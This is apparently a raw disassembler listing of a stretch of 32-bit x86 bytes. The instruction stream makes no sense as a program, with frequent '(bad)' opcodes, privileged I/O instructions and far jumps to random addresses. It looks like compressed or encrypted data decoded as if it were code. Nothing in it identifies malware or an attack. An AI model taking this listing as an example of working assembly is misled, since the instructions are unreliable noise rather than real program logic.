  424fb5:	popf   
  424fb6:	icebp  
  424fb7:	ins    BYTE PTR es:[edi],dx
  424fb8:	cs das 
  424fba:	fcmovu st,st(4)
  424fbc:	add    DWORD PTR [eax],eax
  424fbe:	rol    DWORD PTR [esi],cl
  424fc0:	add    BYTE PTR [eax],al
  424fc2:	or     eax,0x748e587
  424fc7:	cmp    cl,BYTE PTR [edx-0x21]
  424fca:	not    BYTE PTR [edi]
  424fcc:	xor    eax,0xd81b9c1a
  424fd1:	fisubr DWORD PTR [edi]
  424fd3:	out    dx,eax
  424fd4:	adc    al,0x81
  424fd6:	adc    ebx,DWORD PTR [ebx]
  424fd8:	inc    esp
  424fd9:	shl    BYTE PTR [edi],cl
  424fdb:	adc    al,BYTE PTR [eax+edx*1+0x22]
  424fdf:	cmp    ch,BYTE PTR [ebp-0x1e0c7b5f]
  424fe5:	retf   0xdcf5
  424fe8:	mov    ds:0x738032ed,eax
  424fed:	xchg   ebx,eax
  424fee:	lods   al,BYTE PTR ds:[esi]
  424fef:	(bad)  
  424ff1:	push   ecx
  424ff2:	loop   0x42501d
  424ff4:	mov    DWORD PTR [edi-0x4acbeda8],ecx
  424ffa:	fldl2e 
  424ffc:	cmp    dh,BYTE PTR [esi+0x1e0d0ccf]
  425002:	jg     0x425052
  425004:	jno    0x425074
  425006:	cmp    al,0xb9
  425008:	dec    ebx
  425009:	pop    ds
  42500a:	or     al,0xed
  42500c:	(bad)  
  42500d:	mov    edi,0x8331626e
  425012:	repnz mov ds:0xdabb36f4,eax
  425018:	ja     0x42506f
  42501a:	and    DWORD PTR gs:[edx+eax*2+0x55bf4aa4],0xf264729f
  425026:	cmp    al,0x54
  425028:	add    eax,0x824dbf6c
  42502d:	jnp    0x424fc2
  42502f:	rol    ebp,cl
  425031:	loope  0x424fea
  425033:	in     al,0x4c
  425035:	clc    
  425036:	jmp    0xd5cabc48
  42503b:	inc    ecx
  42503c:	fsubr  st(4),st
  42503e:	inc    esi
  42503f:	cmp    al,BYTE PTR [ebx-0x51ba0cac]
  425045:	(bad)  [edx-0x1d4c35d7]
  42504b:	int    0x57
  42504d:	xchg   BYTE PTR [ebx],ah
  42504f:	cmc    
  425050:	sbb    al,0x2b
  425052:	sbb    esi,DWORD PTR [ebx-0x6b]
  425055:	loope  0x425016
  425057:	imul   ebx,DWORD PTR [ebx],0x1c
  42505a:	sub    BYTE PTR [ebx+0x74d1f0af],cl
  425060:	jmp    0x425099
  425062:	push   ecx
  425063:	ja     0x425083
  425065:	sbb    cl,BYTE PTR [eax+0xc]
  425068:	cmp    ah,BYTE PTR [ecx]
  42506a:	cmp    BYTE PTR [ebx+ebp*2],ah
  42506d:	dec    edx
  42506e:	jnp    0x4250a1
  425070:	cmp    esp,DWORD PTR [ecx+0xd6000c2]
  425076:	in     al,dx
  425077:	scas   eax,DWORD PTR es:[edi]
  425078:	cmp    al,0xe6
  42507a:	int3   
  42507b:	popa   
  42507c:	loopne 0x4250e1
  42507e:	adc    DWORD PTR [esi+0x2a819a05],ebx
  425084:	add    al,0xc2
  425086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425087:	cli    
  425088:	mov    ebp,0x88a5ed53
  42508d:	jmp    0x428a:0x977f8ded
  425094:	mov    DWORD PTR [ebx+0x67],edx
  425097:	jle    0x42505a
  425099:	adc    eax,0xa92ecd5e
  42509e:	add    DWORD PTR [eax+0x21ba618d],ebp
  4250a4:	dec    edx
  4250a5:	mov    ds:0xcf643b46,al
  4250aa:	retf   
  4250ab:	out    dx,al
  4250ac:	sbb    DWORD PTR [eax+0x71f02c98],ecx
  4250b2:	in     al,0x5a
  4250b4:	std    
  4250b5:	cmp    al,0x60
  4250b7:	daa    
  4250b8:	and    DWORD PTR [ebx+eax*8-0x6a0b6a57],esi
  4250bf:	or     al,0x43
  4250c1:	mov    ah,0xf5
  4250c3:	stos   BYTE PTR es:[edi],al
  4250c4:	(bad)  
  4250c5:	aas    
  4250c6:	imul   ebx,DWORD PTR [edx],0x64f0d545
  4250cc:	jmp    0x4250ba
  4250ce:	dec    edx
  4250cf:	sub    BYTE PTR [edx],0xea
  4250d2:	sar    DWORD PTR [esi+0x56f92541],cl
  4250d8:	(bad)  
  4250d9:	add    BYTE PTR [edi+ecx*8+0x41fae7fd],ch
  4250e0:	pusha  
  4250e1:	xor    eax,0x48d283e4
  4250e6:	push   cs
  4250e7:	push   ecx
  4250e8:	lds    ebx,FWORD PTR [edi]
  4250ea:	icebp  
  4250eb:	aas    
  4250ec:	ins    BYTE PTR es:[edi],dx
  4250ed:	sbb    edx,DWORD PTR [ebp+0x2841b220]
  4250f3:	push   edx
  4250f4:	mov    bl,0x10
  4250f6:	adc    esp,DWORD PTR [esi]
  4250f8:	jb     0x42513f
  4250fa:	pop    es
  4250fb:	push   ecx
  4250fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250fd:	(bad)  
  4250fe:	jmp    0x6a39:0x31b7d53a
  425105:	add    DWORD PTR [eax+0x25],ebx
  425108:	les    esi,FWORD PTR [eax+edi*1]
  42510b:	pandn  mm7,QWORD PTR [eax]
  42510e:	cmp    ch,BYTE PTR [ebx]
  425110:	sub    bl,BYTE PTR [edx-0x23141043]
  425116:	cmp    al,0x45
  425118:	jmp    0xe687:0xbd716a25
  42511f:	push   ss
  425120:	push   cs
  425121:	push   esi
  425122:	push   es
  425123:	xchg   esi,eax
  425124:	or     al,0xec
  425126:	jne    0x42513a
  425128:	ror    BYTE PTR [edx],0xe9
  42512b:	cmp    DWORD PTR [edi-0x1dc0cde7],esi
  425131:	cmp    BYTE PTR [ecx-0x78],dh
  425134:	mov    ds:0x1e11279c,al
  425139:	or     BYTE PTR [ebx-0x75aaab5b],dl
  42513f:	in     eax,dx
  425140:	xor    al,0xab
  425142:	ss sti 
  425144:	out    0x95,al
  425146:	clts   
  425148:	xchg   edi,eax
  425149:	stos   DWORD PTR es:[edi],eax
  42514a:	mov    esi,DWORD PTR [ebx+0x34]
  42514d:	outs   dx,DWORD PTR ds:[esi]
  42514e:	leave  
  42514f:	mov    ds:0x6a82834f,eax
  425154:	stos   BYTE PTR es:[edi],al
  425155:	adc    BYTE PTR [edx+edi*2-0x3240524],cl
  42515c:	mov    BYTE PTR [ebp-0x1eaab13c],dh
  425162:	aaa    
  425163:	icebp  
  425164:	xor    eax,0x652f80b3
  425169:	xchg   DWORD PTR [edx],esi
  42516b:	dec    ebp
  42516c:	xchg   BYTE PTR [edx-0x6b],dl
  42516f:	push   0xfffffff1
  425171:	jmp    0x5a3fab88
  425176:	mov    edi,0x6c2ec940
  42517b:	push   esi
  42517c:	mov    dh,0xe7
  42517e:	add    al,0x74
  425180:	ret    
  425181:	pop    ecx
  425182:	mov    BYTE PTR [ebx],dl
  425184:	es out 0x2b,al
  425187:	stos   BYTE PTR es:[edi],al
  425188:	lods   al,BYTE PTR ds:[esi]
  425189:	adc    dh,dh
  42518b:	ins    BYTE PTR es:[edi],dx
  42518c:	ins    DWORD PTR es:[edi],dx
  42518d:	into   
  42518e:	xchg   ebx,eax
  42518f:	dec    ecx
  425190:	jbe    0x425123
  425192:	sti    
  425193:	(bad)  
  425194:	mov    ch,0x15
  425196:	push   ds
  425197:	mov    dh,0xc0
  425199:	iret   
  42519a:	and    ebp,esp
  42519c:	push   esi
  42519d:	jge    0x42517e
  42519f:	mov    ch,0xef
  4251a1:	mov    bl,0xf6
  4251a3:	pop    es
  4251a4:	ficomp WORD PTR [edi-0x40]
  4251a7:	ja     0x425151
  4251a9:	xor    eax,0xdabc3e29
  4251ae:	xchg   ebp,eax
  4251af:	jae    0x42513a
  4251b1:	pop    ss
  4251b2:	hlt    
  4251b3:	xchg   DWORD PTR [edx],eax
  4251b5:	gs fs int3 
  4251b8:	(bad)  
  4251b9:	pop    ebx
  4251ba:	into   
  4251bb:	push   es
  4251bc:	out    0xbd,al
  4251be:	pop    ebp
  4251bf:	mov    dh,0xd4
  4251c1:	jns    0x4251ff
  4251c3:	or     eax,0xd249a4c4
  4251c8:	sbb    al,0xad
  4251ca:	jnp    0x425217
  4251cc:	xchg   ebx,eax
  4251cd:	push   0x20
  4251cf:	mov    ah,0x93
  4251d1:	xchg   edi,eax
  4251d2:	ins    DWORD PTR es:[edi],dx
  4251d3:	jbe    0x425215
  4251d5:	inc    edi
  4251d6:	(bad)  
  4251d7:	(bad)  
  4251d8:	jo     0x42516e
  4251da:	xchg   DWORD PTR [eax],esp
  4251dc:	xchg   edi,eax
  4251dd:	retf   
  4251de:	xchg   esi,eax
  4251df:	push   0x33
  4251e1:	fcomp  QWORD PTR [eax-0xd6acb6e]
  4251e7:	iret   
  4251e8:	div    edx
  4251ea:	repz iret 
  4251ec:	or     al,0x3d
  4251ee:	call   0xb5a3:0xd7fb4e30
  4251f5:	and    BYTE PTR [edi],dh
  4251f7:	adc    DWORD PTR [esi-0x1af1dc44],ebx
  4251fd:	retf   
  4251fe:	xchg   bx,ax
  425200:	dec    ebx
  425201:	lods   eax,DWORD PTR ds:[esi]
  425202:	inc    esi
  425203:	or     eax,0x65cbea66
  425208:	mov    cl,0x77
  42520a:	jo     0x42523a
  42520c:	in     al,dx
  42520d:	sub    al,BYTE PTR [ebx+0x4fb8a01c]
  425213:	mov    edi,0xa40e99ee
  425218:	nop
  425219:	adc    edx,esp
  42521b:	xor    ebx,esi
  42521d:	pop    edx
  42521e:	out    0x49,eax
  425220:	mov    dl,0x1
  425222:	sbb    BYTE PTR [edi-0x47],al
  425225:	xor    ebx,DWORD PTR [ecx+0x49404721]
  42522b:	xor    eax,0x8de848e5
  425230:	dec    edx
  425231:	sbb    ebx,ebp
  425233:	mov    eax,ds:0xd4869b47
  425238:	out    dx,eax
  425239:	adc    BYTE PTR ds:0x97c0ac16,dl
  42523f:	aad    0x6d
  425241:	add    dh,BYTE PTR [ecx-0x7b9d0c9]
  425247:	aaa    
  425248:	mov    ebx,0xe5121320
  42524d:	or     ah,0xc4
  425250:	div    DWORD PTR [edx]
  425252:	adc    DWORD PTR [edx+0x7b2a6ba9],esi
  425258:	out    dx,al
  425259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42525a:	repnz outs dx,BYTE PTR ds:[esi]
  42525c:	shl    DWORD PTR [edx-0xd],cl
  42525f:	ins    DWORD PTR es:[edi],dx
  425260:	shr    DWORD PTR [ebx-0x38],1
  425263:	add    DWORD PTR [eax+0x69],esp
  425266:	push   edx
  425267:	mov    ah,0x32
  425269:	sub    eax,0xc342f6f9
  42526e:	inc    ebx
  42526f:	jmp    0xa512:0xae2b8896
  425276:	enter  0xc425,0x2f
  42527a:	daa    
  42527b:	aad    0x2c
  42527d:	aam    0x60
  42527f:	mov    esp,fs
  425281:	ror    DWORD PTR [esi+0x70cd166e],1
  425287:	push   esp
  425288:	cwde   
  425289:	sub    BYTE PTR [eax+0x3decfe36],ah
  42528f:	and    DWORD PTR [edi+0x11ff5897],0xc4e75935
  425299:	jb     0x425247
  42529b:	mov    dl,0x52
  42529d:	push   edx
  42529e:	or     eax,0xeb021c07
  4252a3:	sub    DWORD PTR [ecx+esi*2-0x1bae32d7],esp
  4252aa:	stc    
  4252ab:	and    eax,0x94aa7d8a
  4252b0:	dec    edx
  4252b1:	xlat   BYTE PTR ds:[ebx]
  4252b2:	addr16 or eax,0x130fb5a2
  4252b8:	(bad)  
  4252b9:	out    0xaf,al
  4252bb:	mov    eax,ds:0x6de749e
  4252c0:	scas   eax,DWORD PTR es:[edi]
  4252c1:	jge    0x425317
  4252c3:	(bad)  
  4252c4:	pop    edi
  4252c5:	inc    edx
  4252c6:	mov    al,ds:0xfbac4d48
  4252cb:	xor    dh,BYTE PTR [ebx+0x66]
  4252ce:	jl     0x4252e1
  4252d0:	clc    
  4252d1:	in     eax,0xc
  4252d3:	pop    edi
  4252d4:	mov    esp,0xfe223a69
  4252d9:	add    eax,0x41d81202
  4252de:	push   ebp
  4252df:	xchg   ebx,eax
  4252e0:	jmp    0x6ab6a144
  4252e5:	inc    esp
  4252e6:	push   esp
  4252e7:	leave  
  4252e8:	in     al,dx
  4252e9:	call   0x70c1e183
  4252ee:	jge    0x42534c
  4252f0:	in     al,dx
  4252f1:	mov    ecx,0xcc119158
  4252f6:	dec    esp
  4252f7:	mov    eax,0xf64b482e
  4252fc:	push   es
  4252fd:	xchg   BYTE PTR [edi],cl
  4252ff:	adc    al,0xd8
  425301:	add    eax,0x3cf085f9
  425306:	call   0xe3a4b1a3
  42530b:	fstp   TBYTE PTR [edi+0x7d8a9b5e]
  425311:	mov    eax,ds:0x42052e6e
  425316:	push   edx
  425318:	pop    ss
  425319:	xchg   BYTE PTR [eax],bl
  42531b:	test   ebx,edi
  42531d:	popf   
  42531e:	inc    esp
  42531f:	pushf  
  425320:	les    eax,FWORD PTR [ebx-0x59]
  425323:	scas   eax,DWORD PTR es:[edi]
  425324:	inc    esp
  425325:	sub    eax,0xadc51ee0
  42532a:	sub    BYTE PTR [edi],ch
  42532c:	pop    edx
  42532d:	retf   
  42532e:	mov    edx,0x5cfbd539
  425333:	call   0xde5a:0x78ee320f
  42533a:	xchg   BYTE PTR [eax],al
  42533c:	outs   dx,BYTE PTR ds:[esi]
  42533d:	je     0x42535a
  42533f:	add    BYTE PTR [eax+0x17b43240],cl
  425345:	add    bh,dl
  425347:	jne    0x425378
  425349:	sub    DWORD PTR [edx-0x3e],esi
  42534c:	pop    ebx
  42534d:	js     0x4252ee
  42534f:	sti    
  425350:	das    
  425351:	fs add ch,al
  425354:	ins    DWORD PTR es:[edi],dx
  425355:	adc    eax,0x61d0a96c
  42535a:	adc    cl,al
  42535c:	and    DWORD PTR [esi],edx
  42535e:	add    dh,BYTE PTR [ebp+0x3e8722e9]
  425364:	cmp    al,0x5b
  425366:	mov    eax,0xc7ac61fb
  42536b:	jns    0x425333
  42536d:	test   al,0x2f
  42536f:	jbe    0x4253a4
  425371:	jae    0x4253a8
  425373:	mov    eax,ds:0xe30b71cf
  425378:	or     DWORD PTR [ebp+0x63],esi
  42537b:	xor    BYTE PTR [ecx],0x46
  42537e:	pop    edi
  42537f:	pop    ss
  425380:	pop    ds
  425381:	xchg   edx,eax
  425382:	sbb    edi,eax
  425384:	shl    DWORD PTR [eax],1
  425386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425387:	repz in eax,dx
  425389:	fsubr  QWORD PTR [esi]
  42538b:	inc    esp
  42538c:	test   esi,0x6445b151
  425392:	mov    ecx,0x128fc87d
  425397:	rol    DWORD PTR [ebp+0x57084c88],0x8e
  42539e:	pop    edi
  42539f:	sub    al,0xbe
  4253a1:	mov    bh,0xff
  4253a3:	and    eax,0x7cecd10a
  4253a8:	in     eax,0x4f
  4253aa:	xchg   esp,eax
  4253ab:	sahf   
  4253ac:	sub    BYTE PTR [eax+0x2d7b9219],cl
  4253b2:	adc    ebp,DWORD PTR [eax+0x4b8a76d1]
  4253b8:	add    eax,0x1ca4504d
  4253bd:	pop    esp
  4253be:	mov    ecx,0xd647e52d
  4253c3:	sbb    ebx,DWORD PTR [ecx+eax*2-0x44ec6ddf]
  4253ca:	js     0x425381
  4253cc:	fidiv  WORD PTR fs:[ebp+0xe]
  4253d0:	sbb    eax,0x5d695206
  4253d5:	mov    bl,0x51
  4253d7:	jo     0x425373
  4253d9:	inc    esp
  4253da:	adc    al,0x33
  4253dc:	pop    esi
  4253dd:	sub    BYTE PTR [eax+edx*2],bh
  4253e0:	mov    bl,0xd0
  4253e2:	cmc    
  4253e3:	sub    al,0xa0
  4253e5:	int3   
  4253e6:	pop    esp
  4253e7:	add    BYTE PTR [esp+ebp*4-0x1b],0xb3
  4253ec:	(bad)  
  4253ed:	sbb    esp,DWORD PTR [esi]
  4253ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253f0:	int3   
  4253f1:	(bad)  
  4253f2:	leave  
  4253f3:	add    DWORD PTR [edi-0x2e4fa9c4],ebp
  4253f9:	out    dx,eax
  4253fa:	push   ebx
  4253fb:	out    dx,al
  4253fc:	jge    0x425413
  4253fe:	sub    al,0x29
  425400:	mov    edx,0x447c8a9a
  425405:	pop    eax
  425406:	nop    WORD PTR [eax+0x5fe45c96]
  42540e:	push   0xffffff89
  425410:	add    eax,0x426d6ebc
  425415:	jmp    0x1942e217
  42541a:	push   ecx
  42541b:	xchg   ecx,eax
  42541c:	pop    edi
  42541d:	dec    ebp
  42541e:	fisubr DWORD PTR [edi]
  425420:	cli    
  425421:	inc    ebx
  425422:	test   BYTE PTR [edx-0x75],ch
  425425:	sbb    eax,0xa5ef7d4b
  42542a:	into   
  42542b:	rcl    BYTE PTR [esi+0x3f],0x75
  42542f:	xor    edx,DWORD PTR [edi]
  425431:	sub    eax,0x997213e5
  425436:	sar    DWORD PTR [esi-0x7b],cl
  425439:	out    0x45,al
  42543b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42543c:	dec    ebx
  42543d:	adc    eax,0x40ded58d
  425442:	dec    esp
  425443:	add    bl,dh
  425445:	ins    BYTE PTR es:[edi],dx
  425446:	or     al,0xb
  425448:	ret    0xa2ec
  42544b:	aad    0xf3
  42544d:	pop    ebp
  42544e:	add    BYTE PTR [ecx],dl
  425450:	popf   
  425451:	inc    ebp
  425452:	enter  0xe68c,0x32
  425456:	mov    al,0xd9
  425458:	out    0x7b,al
  42545a:	cmp    BYTE PTR [ecx-0x7a8acf79],al
  425460:	mov    edx,0xbe1b556c
  425465:	mov    ecx,0xd760ec94
  42546a:	or     al,bh
  42546c:	add    DWORD PTR [edi+0x5],0x26
  425470:	xchg   esi,eax
  425471:	in     al,0xb8
  425473:	xchg   bh,bl
  425475:	repz fsubr st,st(0)
  425478:	push   esp
  425479:	mov    bl,0xec
  42547b:	in     al,dx
  42547c:	popf   
  42547d:	or     bl,dh
  42547f:	or     DWORD PTR ds:0xbfd62241,ecx
  425485:	add    al,0x41
  425487:	ret    0xed24
  42548a:	popa   
  42548b:	fdivr  DWORD PTR [esi+ebx*2+0x1c]
  42548f:	pop    edx
  425490:	adc    eax,0xf1ea375d
  425495:	push   edi
  425496:	imul   esp,DWORD PTR [edx+0x68e73b68],0xef314f79
  4254a0:	inc    esp
  4254a1:	ss jmp 0xe247c542
  4254a7:	in     al,0x6d
  4254a9:	inc    esi
  4254aa:	imul   ecx,DWORD PTR [ecx+0x73],0x966cd182
  4254b1:	xchg   bl,bl
  4254b3:	(bad)  
  4254b4:	pop    esp
  4254b5:	add    al,0xbf
  4254b7:	inc    ebx
  4254b8:	jmp    0x14d1:0x78c07e79
  4254bf:	jnp    0x42548d
  4254c1:	lods   al,BYTE PTR ds:[esi]
  4254c2:	pusha  
  4254c3:	out    0xc4,eax
  4254c5:	cmp    eax,0xc706407d
  4254ca:	loopne 0x4254d1
  4254cc:	dec    ebx
  4254cd:	push   ebp
  4254ce:	xchg   ah,al
  4254d0:	fcomip st,st(3)
  4254d2:	adc    ch,ah
  4254d4:	js     0x42554e
  4254d6:	sbb    BYTE PTR [eax+ecx*4-0x1cd9466b],cl
  4254dd:	arpl   WORD PTR [edi],dx
  4254df:	inc    ebp
  4254e0:	or     al,0x32
  4254e2:	repnz out 0xe8,eax
  4254e5:	repz cmp eax,0x45759e30
  4254eb:	cmp    eax,0x4b86e52a
  4254f0:	sub    al,0x66
  4254f2:	or     al,0x2c
  4254f4:	(bad)  
  4254f5:	and    esp,DWORD PTR [edx]
  4254f7:	push   edi
  4254f8:	mov    ds:0x564a2732,eax
  4254fd:	in     al,dx
  4254fe:	ss call 0x10853285
  425504:	stc    
  425505:	mov    edx,0x17f59a42
  42550a:	pop    edi
  42550b:	(bad)  
  42550c:	retf   
  42550d:	pusha  
  42550e:	inc    esi
  42550f:	bnd call 0x40301e28
  425515:	or     al,0x31
  425517:	mov    ds:0x5974a723,al
  42551c:	or     ch,BYTE PTR [esp+ecx*4+0x1fbda776]
  425523:	xor    eax,0xd9696d5
  425528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425529:	xchg   esp,eax
  42552a:	inc    edx
  42552b:	jg     0x4254d4
  42552d:	inc    ebx
  42552e:	outs   dx,DWORD PTR ds:[esi]
  42552f:	lea    edi,[edx+edx*2-0x4a]
  425533:	cmp    al,0xda
  425535:	loopne 0x42553d
  425537:	cmp    eax,0xb9e07024
  42553c:	cmp    BYTE PTR [eax-0x24d105e5],0xe2
  425543:	cmp    DWORD PTR [ecx-0x5ec96851],0x4e
  42554a:	cmp    dh,dh
  42554c:	loop   0x42555c
  42554e:	in     al,0x4f
  425550:	pushf  
  425551:	push   ebp
  425552:	and    BYTE PTR [eax],al
  425554:	push   ecx
  425555:	xor    esp,DWORD PTR [eax+0x64]
  425558:	int    0xa
  42555a:	out    dx,al
  42555b:	inc    esp
  42555c:	fcom   DWORD PTR [esi+0x2b828b19]
  425562:	sti    
  425563:	add    eax,0xca099f33
  425568:	jge    0x4255af
  42556a:	adc    esi,DWORD PTR [edi-0x2ade4fac]
  425570:	inc    ebp
  425571:	cmp    BYTE PTR [eax-0x1d2c8dbb],al
  425577:	push   ebx
  425579:	hlt    
  42557a:	cmp    DWORD PTR [ebp-0x6d85a382],ebx
  425580:	push   eax
  425581:	cmp    ah,bl
  425583:	int3   
  425584:	ins    DWORD PTR es:[edi],dx
  425585:	inc    ebx
  425586:	dec    edi
  425587:	not    DWORD PTR [edi-0x2c4ac0f7]
  42558d:	mov    ecx,0x61558f03
  425592:	out    dx,al
  425593:	sub    eax,0xfed04108
  425598:	ins    DWORD PTR es:[edi],dx
  425599:	jo     0x425586
  42559b:	xchg   BYTE PTR [ebx+0x42291380],bl
  4255a1:	retf   0xb2e5
  4255a4:	pushf  
  4255a5:	out    0x52,al
  4255a7:	loope  0x425600
  4255a9:	out    0xff,eax
  4255ab:	mov    ch,0xf9
  4255ad:	or     BYTE PTR [esi-0x80],al
  4255b0:	push   esp
  4255b1:	fimul  WORD PTR [esi+0x70fb4192]
  4255b7:	popf   
  4255b8:	jbe    0x42557c
  4255ba:	mov    DWORD PTR [ecx-0x151f83ff],ebp
  4255c0:	and    DWORD PTR [ebx],edi
  4255c2:	sti    
  4255c3:	iret   
  4255c4:	loop   0x4255fd
  4255c6:	hlt    
  4255c7:	rcr    DWORD PTR [ecx+ecx*4+0x5eeea012],0x3a
  4255cf:	cmp    esp,DWORD PTR [edx]
  4255d1:	(bad)  
  4255d2:	pop    esi
  4255d3:	push   ss
  4255d4:	scas   eax,DWORD PTR es:[edi]
  4255d5:	mov    DWORD PTR [eax+ecx*1],ecx
  4255d8:	(bad)  
  4255d9:	retf   
  4255da:	jl     0x42564f
  4255dc:	fnstcw WORD PTR [edx-0x59f402cb]
  4255e2:	sbb    edx,DWORD PTR [edi]
  4255e4:	cmp    eax,0x7845f30f
  4255e9:	push   ebp
  4255ea:	sbb    eax,0xdb1c856a
  4255ef:	cmp    ah,BYTE PTR [ecx-0x3a]
  4255f2:	call   0xb2d8:0xfc8be9e6
  4255f9:	pushf  
  4255fa:	and    cl,BYTE PTR [esi]
  4255fc:	and    BYTE PTR [ebx+0x38991630],al
  425602:	ud1    ebx,edi
  425605:	stc    
  425606:	jno    0x425598
  425608:	dec    ebp
  425609:	(bad)  
  42560a:	out    0xf3,al
  42560c:	xchg   edx,eax
  42560d:	push   eax
  42560e:	mov    BYTE PTR [ebp-0x22],dl
  425611:	outs   dx,BYTE PTR ds:[esi]
  425612:	jg     0x4255a7
  425614:	outs   dx,DWORD PTR ds:[esi]
  425615:	dec    ecx
  425616:	mov    dh,0xb
  425618:	sbb    edx,DWORD PTR [edi-0x32]
  42561b:	test   esi,eax
  42561d:	popa   
  42561e:	cmp    al,0x8b
  425620:	xor    al,0x11
  425622:	clc    
  425623:	cmp    ecx,DWORD PTR [edx*4-0x4d087b14]
  42562a:	mov    ebp,0x5a0e4acc
  42562f:	or     al,0x33
  425631:	jecxz  0x425603
  425633:	inc    esp
  425634:	and    ah,BYTE PTR [esi*2-0x7da339db]
  42563b:	and    eax,0xbe03a4f5
  425640:	mov    eax,ds:0x18a85b87
  425645:	loopne 0x4255df
  425647:	push   eax
  425648:	repnz xor dl,BYTE PTR [esi]
  42564b:	shr    DWORD PTR [edx+0x6827fbe5],cl
  425651:	(bad)  [ebx+ecx*4-0x20472f72]
  425658:	mov    ds:0xfaacc85e,eax
  42565d:	mov    dl,0x5
  42565f:	fcmovnu st,st(6)
  425661:	xor    eax,DWORD PTR [esi+edx*2+0xc]
  425665:	jp     0x425690
  425667:	outs   dx,BYTE PTR ds:[esi]
  425668:	inc    esp
  425669:	sar    BYTE PTR [eax-0x4b],0x8e
  42566d:	fwait
  42566e:	sub    eax,0xd90e262a
  425673:	sbb    bh,dl
  425675:	hlt    
  425676:	push   cs
  425677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425678:	xor    esp,DWORD PTR [eax+esi*8+0x4acf0ff7]
  42567f:	jb     0x42563e
  425681:	and    dh,BYTE PTR [ecx+0x279f3e24]
  425687:	pop    esp
  425688:	pop    esp
  425689:	mov    edi,DWORD PTR [esi+0x2f321c85]
  42568f:	mov    esi,0x1a3077f1
  425694:	dec    edx
	...
  4256a9:	add    BYTE PTR [ecx+0x55],bl
  4256ac:	push   esp
  4256ad:	push   edx
  4256ae:	pop    esp
  4256af:	push   ebx
  4256b0:	pop    edi
  4256b1:	pop    edi
  4256b2:	xchg   ebx,eax
  4256b3:	stos   DWORD PTR es:[edi],eax
  4256b4:	mov    ebx,0xc8ec6e96
  4256b9:	pop    ecx
  4256ba:	lods   eax,DWORD PTR ds:[esi]
  4256bb:	jecxz  0x4256be
  4256bd:	add    bl,dl
  4256bf:	push   es
  4256c0:	add    BYTE PTR [eax],al
  4256c2:	mov    eax,ds:0xbd53d589
  4256c7:	repnz or bl,dh
  4256ca:	(bad)  
  4256cc:	mov    ebx,0xbff7aaef
  4256d1:	retf   0x925f
  4256d4:	mov    edi,0x71675eb5
  4256d9:	xchg   esi,eax
  4256da:	xor    ah,bl
  4256dc:	pusha  
  4256dd:	ja     0x42572d
  4256df:	jae    0x4256d6
  4256e1:	stc    
  4256e2:	(bad)  
  4256e3:	daa    
  4256e4:	cdq    
  4256e5:	adc    eax,0xf5ec9ad6
  4256ea:	jb     0x4256b0
  4256ec:	je     0x42575a
  4256ee:	jge    0x425763
  4256f0:	aad    0xec
  4256f2:	es dec esp
  4256f4:	test   ebp,ebp
  4256f6:	jns    0x4256c1
  4256f8:	add    ch,ch
  4256fa:	inc    eax
  4256fb:	inc    ebp
  4256fc:	loop   0x4256da
  4256fe:	int3   
  4256ff:	in     al,0xd3
  425701:	jns    0x42576f
  425703:	mov    esi,0xb8e2d454
  425708:	cmc    
  425709:	or     al,0xc1
  42570b:	or     al,0xdb
  42570d:	dec    esp
  42570e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42570f:	dec    ecx
  425710:	xchg   DWORD PTR [ecx+0x7c],ecx
  425713:	jmp    0x4256fc
  425715:	ss xchg esp,eax
  425717:	adc    edi,0x93c1031d
  42571d:	xchg   DWORD PTR [ebx+0x6613ed1a],ebx
  425723:	mov    ah,0xc1
  425725:	icebp  
  425726:	or     bh,BYTE PTR [ecx+ebp*4-0x58]
  42572a:	jns    0x4257a1
  42572c:	pop    es
  42572d:	nop
  42572e:	idiv   BYTE PTR [ecx+ebp*4-0x3762521c]
  425735:	or     edx,DWORD PTR [ecx+0x30a3b48b]
  42573b:	sbb    al,0xb7
  42573d:	xor    DWORD PTR [ebx],ebp
  42573f:	fadd   DWORD PTR [eax]
  425741:	es inc ebp
  425743:	pusha  
  425744:	pushf  
  425745:	std    
  425746:	out    dx,eax
  425747:	(bad)
  42574a:	(bad)  
  42574b:	fdiv   QWORD PTR [edi]
  42574d:	xor    DWORD PTR [ebx+esi*4+0x70],0x2c
  425752:	add    dh,BYTE PTR [esi-0x7a723fde]
  425758:	pop    ecx
  425759:	ficom  WORD PTR [ebp-0x482c0d27]
  42575f:	dec    ebx
  425760:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  425762:	or     eax,0xee1ba84b
  425767:	cmp    cl,BYTE PTR [edi]
  425769:	mov    DWORD PTR [ecx-0x78],0xd8f32998
  425770:	ds inc ebp
  425772:	out    dx,al
  425773:	(bad)  
  425774:	dec    esi
  425775:	xchg   edi,eax
  425776:	jmp    0x32a4:0x86ef3409
  42577d:	ja     0x42578e
  42577f:	cld    
  425780:	xchg   BYTE PTR [eax-0x1a],bl
  425783:	jg     0x425751
  425785:	pusha  
  425786:	dec    eax
  425787:	mov    ah,0xe3
  425789:	push   esp
  42578a:	mov    dh,0xfd
  42578c:	inc    ebp
  42578d:	iret   
  42578e:	gs pushf 
  425790:	cdq    
  425791:	mov    fs,WORD PTR [edi-0x5f]
  425794:	dec    edi
  425795:	xor    eax,0x4451cd58
  42579a:	xor    BYTE PTR [ecx+0x19],ah
  42579d:	icebp  
  42579e:	add    DWORD PTR [ebp+0x2f2ade34],eax
  4257a4:	or     DWORD PTR [esi-0x72132b2f],eax
  4257aa:	sub    DWORD PTR [edi],ebp
  4257ac:	cmp    eax,0x24fbe91
  4257b1:	vmread DWORD PTR [edx-0x49],edi
  4257b5:	outs   dx,BYTE PTR ds:[esi]
  4257b6:	out    dx,eax
  4257b7:	fisttp WORD PTR [ebp+0x5a]
  4257ba:	fidiv  WORD PTR [ecx-0x1df34d07]
  4257c0:	dec    ecx
  4257c1:	bound  esp,QWORD PTR [ecx+edi*4+0x17]
  4257c5:	dec    eax
  4257c6:	fcom   st(4)
  4257c8:	sbb    eax,edx
  4257ca:	dec    esi
  4257cb:	test   al,0x8a
  4257cd:	(bad)  
  4257cf:	or     DWORD PTR [edx+ebp*2],edx
